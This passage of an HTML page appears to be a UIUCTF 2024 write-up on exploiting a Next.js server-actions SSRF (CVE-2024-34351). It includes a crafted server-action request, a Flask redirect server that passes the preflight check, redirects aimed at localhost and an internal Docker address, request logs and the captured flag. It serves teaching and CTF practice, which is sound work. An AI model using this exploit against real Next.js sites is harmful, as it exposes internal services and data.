+<span class="na">Cookie</span><span class="p">:</span> <span class="s">authjs.csrf-token=3a88d122c42873637d81db77edf8571e94e78697010629b27d9d1632876b75ad%7C250eafa2f8899729450d0228f76b528c95b155ca24e929d61e934ce559b299b5</span>
+
+-----------------------------30523002528298602961754182131
+Content-Disposition: form-data; name="1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de"
+
+
+-----------------------------30523002528298602961754182131
+Content-Disposition: form-data; name="0"
+
+["$K1"]
+-----------------------------30523002528298602961754182131--
+</code></pre></div></div>
+
+<blockquote>
+  <p>Note: The <code class="language-plaintext highlighter-rouge">Origin</code> header and the header’s value <code class="language-plaintext highlighter-rouge">/</code> is required.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701144253.png" alt="" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|14:40:17<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+127.0.0.1 - - <span class="o">[</span>01/Jul/2024 14:42:10] code 404, message File not found
+127.0.0.1 - - <span class="o">[</span>01/Jul/2024 14:42:10] <span class="s2">"HEAD /login HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<blockquote>
+  <p>Note: The HEAD request is the CORS (Cross-Origin Resource Sharing) preflight check.</p>
+</blockquote>
+
+<p>Nice! We got a <strong>blind SSRF</strong>!</p>
+
+<p>Now, you may wonder: Can we read the response body?</p>
+
+<p><strong>Let’s look back to the function <code class="language-plaintext highlighter-rouge">createRedirectRenderResult</code>’s <code class="language-plaintext highlighter-rouge">fetch</code> call:</strong></p>
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">[...]</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">fetchUrl</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="nx">forwardedHeaders</span><span class="p">,</span>
+        <span class="na">next</span><span class="p">:</span> <span class="p">{</span>
+          <span class="c1">// @ts-ignore</span>
+          <span class="na">internal</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">},</span>
+      <span class="p">})</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">content-type</span><span class="dl">'</span><span class="p">)</span> <span class="o">===</span> <span class="nx">RSC_CONTENT_TYPE_HEADER</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">[...]</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nx">FlightRenderResult</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="o">!</span><span class="p">)</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="p">[...]</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+      <span class="p">[...]</span>
+    <span class="p">}</span>
+  <span class="p">[...]</span>
+  <span class="k">return</span> <span class="nx">RenderResult</span><span class="p">.</span><span class="nx">fromStatic</span><span class="p">(</span><span class="dl">'</span><span class="s1">{}</span><span class="dl">'</span><span class="p">)</span>
+  <span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>As you can see, if the response header <code class="language-plaintext highlighter-rouge">Content-Type</code> is <code class="language-plaintext highlighter-rouge">RSC_CONTENT_TYPE_HEADER</code>, it’ll return the response body to us (<code class="language-plaintext highlighter-rouge">return new FlightRenderResult(response.body!)</code>)!</p>
+
+<p><strong>Uhh… What’s that <code class="language-plaintext highlighter-rouge">RSC_CONTENT_TYPE_HEADER</code>? Actually, it’s just <code class="language-plaintext highlighter-rouge">text/x-component</code>:</strong></p>
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
+<span class="k">import</span> <span class="p">{</span>
+  <span class="nx">RSC_HEADER</span><span class="p">,</span>
+  <span class="nx">RSC_CONTENT_TYPE_HEADER</span><span class="p">,</span>
+<span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">../../client/components/app-router-headers</span><span class="dl">'</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+
+<p><strong><code class="language-plaintext highlighter-rouge">app-router-headers.ts</code>:</strong></p>
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[...]</span>
+<span class="k">export</span> <span class="kd">const</span> <span class="nx">RSC_CONTENT_TYPE_HEADER</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">text/x-component</span><span class="dl">'</span> <span class="k">as</span> <span class="kd">const</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>So… Firstly, in the CORS preflight check HEAD request, if we <strong>set the response header <code class="language-plaintext highlighter-rouge">Content-Type</code> to <code class="language-plaintext highlighter-rouge">text/x-component</code></strong>, the CORS preflight check should be passed. Then, we can read the response body.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p><strong>Let’s write a simple Flask app to verify that!</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="c1"># CORS preflight check
+</span>    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'HEAD'</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">()</span>
+        <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Type'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'text/x-component'</span>
+        <span class="k">return</span> <span class="n">response</span>
+    <span class="c1"># after CORS preflight check
+</span>    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">'After CORS preflight check'</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|14:54:52<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; python3 exploit.py    
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p><strong>Then send the POST request at <code class="language-plaintext highlighter-rouge">/logout</code> again:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701150504.png" alt="" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌[siunam♥Mercury]-<span class="o">(</span>~/ctf/UIUCTF-2024/Web/Log-Action<span class="o">)</span>-[2024.07.01|14:54:52<span class="o">(</span>HKT<span class="o">)]</span>
+└&gt; python3 exploit.py
+<span class="o">[</span>...]
+127.0.0.1 - - <span class="o">[</span>01/Jul/2024 15:02:34] <span class="s2">"HEAD /login HTTP/1.1"</span> 200 -
+127.0.0.1 - - <span class="o">[</span>01/Jul/2024 15:02:35] <span class="s2">"GET /login HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Nice! We can now read the response body!</p>
+
+<p>Wait… How can we reach the challenge’s internal services?</p>
+
+<p>Well, <strong>redirect</strong>! In our Flask app, we can redirect the server-side’s <code class="language-plaintext highlighter-rouge">fetch</code> to our intended resource. Let’s update our Flask app source code!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">redirect</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="c1"># CORS preflight check
+</span>    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'HEAD'</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">Response</span><span class="p">()</span>
+        <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Type'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'text/x-component'</span>
+        <span class="k">return</span> <span class="n">response</span>
+    <span class="c1"># after CORS preflight check
+</span>    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
+        <span class="n">ssrfUrl</span> <span class="o">=</span> <span class="s">'http://localhost:3000/'</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">ssrfUrl</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701150912.png" alt="" /></p>
+
+<p>Nice! The SSRF worked!</p>
+
+<p>To get the flag, we can redirect the server-side’s <code class="language-plaintext highlighter-rouge">fetch</code> to the internal back-end.</p>
+
+<p>Uhh… How can we know the back-end IP address??</p>
+
+<p>Since the challenge should be deployed via Docker, we can try to guess/brute force the back-end internal IP address.</p>
+
+<blockquote>
+  <p>Note: We can also use <code class="language-plaintext highlighter-rouge">backend</code> as the host: (I didn’t know this trick before, learned a new thing!)</p>
+
+  <p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701151421.png" alt="" /></p>
+</blockquote>
+
+<p>By default, Docker uses the <strong>default <code class="language-plaintext highlighter-rouge">172.17.0.0/16</code> subnet</strong> for container networking.</p>
+
+<p><strong>After some brute forcing, I found out that the internal IP address for the back-end service is <code class="language-plaintext highlighter-rouge">172.18.0.2</code>:</strong></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">[...]</span>
+    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
+        <span class="n">ssrfUrl</span> <span class="o">=</span> <span class="s">'http://172.18.0.2/flag.txt'</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">ssrfUrl</span><span class="p">)</span>
+    <span class="p">[...]</span>
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/UIUCTF-2024/images/Pasted%20image%2020240701151718.png" alt="" /></p>
+
+<p>Nice! We get the flag!</p>
+
+<ul>
+  <li><strong>Flag: <code class="language-plaintext highlighter-rouge">uiuctf{close_enough_nextjs_server_actions_welcome_back_php}</code></strong></li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>What we’ve learned:</p>
+
+<ol>
+  <li>Exploiting Next.js Server-Side Request Forgery in Server Actions (CVE-2024-34351)</li>
+</ol>
+
+      </section>
+    </div>
+
+    <footer></footer>
+  </body>
+</html>
